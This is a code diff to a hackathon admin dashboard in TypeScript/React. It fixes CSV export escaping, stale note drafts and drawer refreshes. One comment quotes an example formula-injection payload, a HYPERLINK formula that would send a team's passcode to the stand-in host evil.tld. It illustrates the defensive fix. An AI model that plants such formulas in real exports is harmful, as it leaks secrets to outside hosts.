@@ -44,6 +44,26 @@ export interface AdminToast {
 }
 
 /**
+ * Escape one CSV cell.
+ *
+ * Two separate problems this solves:
+ *
+ * 1. Formula injection. Registration is public, so a team can name itself
+ *    `=HYPERLINK("https://evil.tld?d="&V2,"click")` and Excel will execute it
+ *    when an organiser opens the roster — column V is the team passcode. Any
+ *    cell starting with = + - @, tab or CR is prefixed with a single quote,
+ *    which Excel and LibreOffice treat as "this is text".
+ * 2. Delimiter breakage. Several columns were emitted unquoted, so one comma in
+ *    a team name shifted every later column on that row — silently moving the
+ *    passcode under a different heading.
+ */
+function csvCell(value: unknown): string {
+  const s = value === null || value === undefined ? '' : String(value);
+  const neutralised = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+  return `"${neutralised.replace(/"/g, '""')}"`;
+}
+
+/**
  * The deck the jury evaluates: the ACCEPTED one, falling back to the newest for
  * records created before submission statuses existed.
  */
@@ -215,7 +235,18 @@ export default function AdminDashboard() {
     if (team) {
       syncRubricScores(team);
     }
-    setSelectedTeam(team);
+    // Clear drafts tied to the previously open team. `adminNoteInput` persisted
+    // across selections, so a note typed for team A and left unsaved would be
+    // written onto team B on the next SAVE NOTE.
+    setSelectedTeam(prev => {
+      const changed =
+        !team || !prev || (prev.id !== team.id && prev.registration_id !== team.registration_id);
+      if (changed) {
+        setAdminNoteInput(team?.admin_notes || '');
+        setReuploadDecisionNote('');
+      }
+      return team;
+    });
   };
 
   const handleCopyUrl = (url: string, e?: React.MouseEvent) => {
@@ -241,7 +272,8 @@ export default function AdminDashboard() {
   const [teamToDelete, setTeamToDelete] = useState<TeamRecord | null>(null);
 
   // Fetch admin data helper
-  const fetchAdminData = useCallback(async (key: string, isSilent = false) => {
+  // Returns the freshly loaded teams so callers can re-sync the open drawer.
+  const fetchAdminData = useCallback(async (key: string, isSilent = false): Promise<TeamRecord[] | null> => {
     if (!isSilent) setIsLoading(true);
     try {
       const res = await fetch('/api/admin/registrations', {
@@ -252,12 +284,13 @@ export default function AdminDashboard() {
         sessionStorage.removeItem('orion_admin_key');
         setIsAuthenticated(false);
         setAuthError('Session expired. Please enter passcode again.');
-        return;
+        return null;
       }
 
       const json = await res.json();
       if (json.success) {
-        setTeams(json.teams || []);
+        const loadedTeams: TeamRecord[] = json.teams || [];
+        setTeams(loadedTeams);
         setAuditLogs(json.auditLogs || []);
         if (json.config) {
           setConfig(json.config);
@@ -273,16 +306,21 @@ export default function AdminDashboard() {
           round1PendingReview: 0,
           round1Selected: 0,
           round1NotSelected: 0,
+          // Was missing here, so on a stats-less response the RE-UPLOAD REQ tile
+          // rendered `undefined` and pending requests went unnoticed.
+          reuploadRequestsPending: 0,
           totalRevenue: 0,
           countByTrack: {}
         });
         setIsAuthenticated(true);
+        return loadedTeams;
       }
     } catch (err) {
       console.error('Failed to load admin data:', err);
     } finally {
       if (!isSilent) setIsLoading(false);
     }
+    return null;
   }, []);
 
   // Check saved session in sessionStorage
@@ -423,12 +461,17 @@ export default function AdminDashboard() {
         }
         
         // Refresh admin data
-        await fetchAdminData(key, true);
-        
-        // Update currently opened team
-        if (selectedTeam && payload.action !== 'DELETE_TEAM') {
-          const updated = await fetch(`/api/team/portal?teamId=${selectedTeam.registration_id}`).then(r => r.json());
-          if (updated.team) handleSelectTeam(updated.team);
+        const refreshedTeams = await fetchAdminData(key, true);
+
+        // Re-sync the open drawer from the admin payload. This used to call
+        // /api/team/portal without a team token, which always 401s — so the
+        // drawer silently kept showing pre-action state and admins would
+        // re-click VERIFY thinking it had failed.
+        if (refreshedTeams && selectedTeam && payload.action !== 'DELETE_TEAM') {
+          const updated = refreshedTeams.find(
+            t => t.id === selectedTeam.id || t.registration_id === selectedTeam.registration_id
+          );
+          if (updated) handleSelectTeam(updated);
         }
       } else {
         showToast('error', 'Operation Failed', json.error || 'Operation failed');
@@ -510,16 +553,16 @@ export default function AdminDashboard() {
 
       return [
         t.registration_id,
-        `"${t.team_name.replace(/"/g, '""')}"`,
+        t.team_name,
         t.problem_statement,
-        `"${t.leader_name.replace(/"/g, '""')}"`,
-        `"${t.leader_phone}"`,
+        t.leader_name,
+        t.leader_phone,
         t.leader_email,
-        `"${t.institution.replace(/"/g, '""')}"`,
-        `"${t.department || ''}"`,
-        `"${t.year || ''}"`,
+        t.institution,
+        t.department || '',
+        t.year || '',
         t.payment_status,
-        `"${t.payment?.utr_number || ''}"`,
+        t.payment?.utr_number || '',
         t.round_1_status,
         t.round_2_status,
         totalScore,
@@ -531,21 +574,27 @@ export default function AdminDashboard() {
         scores?.feasibility ?? '',
         t.members.length + 1,
         t.access_token,
-        `"${latestSub?.file_url || ''}"`,
-        `"${latestSub?.project_url || ''}"`,
-        `"${latestSub?.repo_url || ''}"`,
+        latestSub?.file_url || '',
+        latestSub?.project_url || '',
+        latestSub?.repo_url || '',
         t.created_at ? t.created_at.split('T')[0] : ''
-      ];
+      ].map(csvCell);
     });
 
-    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
-    const encodedUri = encodeURI(csvContent);
+    const csvContent = [headers.map(csvCell).join(','), ...rows.map(e => e.join(','))].join('\r\n');
+
+    // A Blob, not a data: URI. `encodeURI` leaves '#' unescaped, so a team named
+    // "Team #1" silently truncated the download at that row; data: URIs also cap
+    // out around 2 MB.
+    const blob = new Blob(['﻿' + csvContent], { type: 'text/csv;charset=utf-8;' });
+    const url = URL.createObjectURL(blob);
     const link = document.createElement('a');
-    link.setAttribute('href', encodedUri);
+    link.setAttribute('href', url);
     link.setAttribute('download', `ORION_Hackathon_Roster_${new Date().toISOString().split('T')[0]}.csv`);
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
+    URL.revokeObjectURL(url);
   };
 
   // Filtered Teams
